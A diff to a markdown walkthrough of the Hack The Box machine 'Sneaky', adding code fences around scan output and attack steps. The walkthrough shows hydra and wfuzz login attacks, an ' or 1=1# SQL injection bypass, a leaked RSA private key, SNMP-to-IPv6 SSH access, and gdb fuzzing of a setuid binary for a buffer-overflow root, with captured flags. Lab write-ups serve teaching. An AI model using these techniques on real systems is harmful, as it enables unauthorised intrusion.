@@ -18,7 +18,7 @@ This machine has thought me more about working with ipv6 how to calculate and it
 -----
 
 For the first step I started with normal enumeration through **nmap**
-
+```bat
     TCP scan -> 
 
     nmap -sC -sV -oA sneaky 10.10.10.20
@@ -33,9 +33,9 @@ For the first step I started with normal enumeration through **nmap**
 
     Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     Nmap done: 1 IP address (1 host up) scanned in 13.91 seconds
-
+```
 The first scan revealed a normal http service, after inspection it proved to be a broken webpage but I decided to further investigate with dirbuster and nikcto
-
+```bat
     Nikto scan -> 
     kali@kali:~$ nikto -h 10.10.10.20
     - Nikto v2.1.6
@@ -87,7 +87,7 @@ The first scan revealed a normal http service, after inspection it proved to be 
     ===============================================================
     2020/11/09 03:18:56 Finished
 
-
+```
 After inspection the first thing that popped out was the /dev directory that I had to inspect.
 
 ![/dev](/Sneaky/devFolder.png)
@@ -97,7 +97,7 @@ It was clear that this was a login page and some of the ideas that I had were to
 
 As a result I did another **nmap** scan this time an UDP scan to find more vulnerabilities. 
 A note to self this UDP scan took a lot more than a normal scan.
-
+```bat
     UDP scan -> (note to self udp scan takes a lot of time)
     sudo nmap -sU -A 10.10.10.20
 
@@ -146,7 +146,7 @@ A note to self this UDP scan took a lot more than a normal scan.
     HOP RTT      ADDRESS
     1   86.25 ms 10.10.14.1
     2   86.51 ms 10.10.10.20
-
+```
 I saw that there was an snmp port open but I did not know what snmp was luckly I was able to find a something useful on https://www.offensive-security.com/metasploit-unleashed/snmp-scan/ 
 
 And I did some research on https://en.wikipedia.org/wiki/Simple_Network_Management_Protocol
@@ -170,18 +170,18 @@ I first tried intercepting a normal attempt to login with standard credentials, 
 #### wfuzz
 
 My next line of thought was to use a fuzz attack
-
+```bat
     wfuzz -c -z file,/usr/share/wfuzz/wordlist/Injections/SQL.txt -d "name=admin&pass=Fuzz"  "http://10.10.10.20/dev"
-
+```
 sadly this did not give any useful results
 
 #### hydra
 
 Next I tried a dictionary attack hoping it's just a generic password
-
+```bat
     hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt 10.10.10.20 -V http-form-post '/dev/login.php:name=^USER^&pass=^PASS^:Not Found'
     Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
-
+```
 
 I ran the for 20 minutes no results. I then concluded that this is not a good way to attack it.
 
@@ -190,7 +190,7 @@ I ran the for 20 minutes no results. I then concluded that this is not a good wa
 #### sql bypass
 
 Next I came back to the idea of an SQL injection so I switched to SQLmap. I believe my knowledge of this tool is not sufficient because running SQL map did not give me any results but manually trying some bypass sql injections worked in the end 
-
+```bat
     kali@kali:~$ sqlmap -u "10.10.10.20/dev/"
             ___
         __H__                                                                                                                
@@ -236,7 +236,7 @@ Next I came back to the idea of an SQL injection so I switched to SQLmap. I beli
     404 (Not Found) - 124 times
 
     [*] ending @ 03:21:26 /2020-11-09/
-
+```
 
 Next I tried inserting the sql injections by hand which worked. 
 
@@ -247,15 +247,16 @@ Next I tried inserting the sql injections by hand which worked.
 
 I tried everything in https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/ - 
 SQL Injection 101, Login tricks
-
+```bat
     user  admin
     password : ' or 1=1#
-
+```
 In my key I found an RSA key for ssh. the problem was that there was no SSH port open => this lead me to believe I could ssh using the snmp port
 
 ---
 ### Step 3 - Foothold
 ---
+```bat
         -----BEGIN RSA PRIVATE KEY-----
     MIIEowIBAAKCAQEAvQxBD5yRBGemrZI9F0O13j15wy9Ou8Z5Um2bC0lMdV9ckyU5
     Lc4V+rY81lS4cWUx/EsnPrUyECJTtVXG1vayffJISugpon49LLqABZbyQzc4GgBr
@@ -283,9 +284,9 @@ In my key I found an RSA key for ssh. the problem was that there was no SSH port
     Hu+up36u92YlaT7Yk+fsk/k+IvCPum99pF3QR5SGIkZGIxczy7luxyxqDy3UfG31
     rOgybvKIVYntsE6raXfnYsEcvfbaE0BsREpcOGYpsE+i7xCRqdLb
     -----END RSA PRIVATE KEY-----
-
+```
 Before anything I tried the exploit found for snmp with metasploit but that did not enable anything
-
+```bat
                                     ____________
     [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
     [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
@@ -388,10 +389,10 @@ Before anything I tried the exploit found for snmp with metasploit but that did 
     29  exploit/windows/http/hp_nnm_snmpviewer_actapp        2010-05-11       great      No     HP OpenView Network Node Manager snmpviewer.exe Buffer Overflow
     30  exploit/windows/scada/sunway_force_control_netdbsrv  2011-09-22       great      No     Sunway Forcecontrol SNMP NetDBServer.exe Opcode 0x57
     31  post/windows/gather/enum_snmp                                         normal     No     Windows Gather SNMP Settings Enumeration (Registry)
-
+```
 
     Interact with a module by name or index, for example use 31 or use post/windows/gather/enum_snmp
-
+```bat
     msf5 > use auxiliary/scanner/snmp/snmp_login 
     msf5 auxiliary(scanner/snmp/snmp_login) > show options
 
@@ -421,10 +422,10 @@ Before anything I tried the exploit found for snmp with metasploit but that did 
     [+] 10.10.10.20:161 - Login Successful: public (Access level: read-only); Proof (sysDescr.0): Linux Sneaky 4.4.0-75-generic #96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686
     [*] Scanned 1 of 1 hosts (100% complete)
     [*] Auxiliary module execution completed
-
+```
 I also found a tool made by the creator of the box that allows you to use snmp to get the ipv6 address that you can login with ssh through because ssh was only blocked on ipv4 not on ipv6 something that appears to be a common mistake.
 
-
+```bat
     python enyx.py 2c public 10.10.10.20
     ###################################################################################
     #                                                                                 #
@@ -489,19 +490,19 @@ I also found a tool made by the creator of the box that allows you to use snmp t
     thrasivoulos@Sneaky:~$ cat user.txt 
     9fe14f76222db23a770f20136751bdab
     thrasivoulos@Sneaky:~$ 
-
+```
 ---
 ### Step 4 - Privilage Escalation
 ---
 
 Now that I had acces to the machine I tried the standar sudo su and trying to access root but it was password protected. After taking a look online I found this command that pointed to a faulty binary that could be exploited with a buffer overflow.
-
+```bat
     find / -perm -4000 2>/dev/null
 Command to find all files with 4000 permissions (admin)
-
+```
 
 I took the file and sent it to my own machine 
-
+```bat
     thrasivoulos@Sneaky:/usr/local/bin$ ls
     chal
     thrasivoulos@Sneaky:/usr/local/bin$ cat chal 
@@ -548,9 +549,9 @@ I took the file and sent it to my own machine
     file chal
     chal: setuid, setgid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=fc8ad06fcfafe1fbc2dbaa1a65222d685b047b11, not stripped
 
-
+```
 I used gdb to explploit the file (also had to chmod 600 chal)
-
+```bat
     gdb ./chal
     GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
     Copyright (C) 2014 Free Software Foundation, Inc.
@@ -568,9 +569,9 @@ I used gdb to explploit the file (also had to chmod 600 chal)
     Type "apropos word" to search for commands related to "word"...
     Reading symbols from ./chal...(no debugging symbols found)...done.
     (gdb) 
-
+```
 Next i did some fuzzing to find the exact point of bufferoverflow
-
+```bat
     (gdb) r `python -c 'print("A"*100)';`
     Starting program: /usr/local/bin/chal `python -c 'print("A"*100)';`
     [Inferior 1 (process 1974) exited normally]
@@ -636,10 +637,10 @@ Next i did some fuzzing to find the exact point of bufferoverflow
     Starting program: /usr/local/bin/chal `python -c 'print("A"*361)';`
     [Inferior 1 (process 2010) exited normally]
 (gdb) r `python -c 'print("A"*361)';`
-
+```
 
 after a lot of trial and error I found the right eip and some shellcode to execute with the bufferoverflow
-
+```bat
     find eip 0xbffff4c0
 
 
@@ -681,3 +682,4 @@ after a lot of trial and error I found the right eip and some shellcode to execu
     root.txt
     # cat root.txt
     c5153d86cb175a9d5d9a5cc81736fb33
+    ```
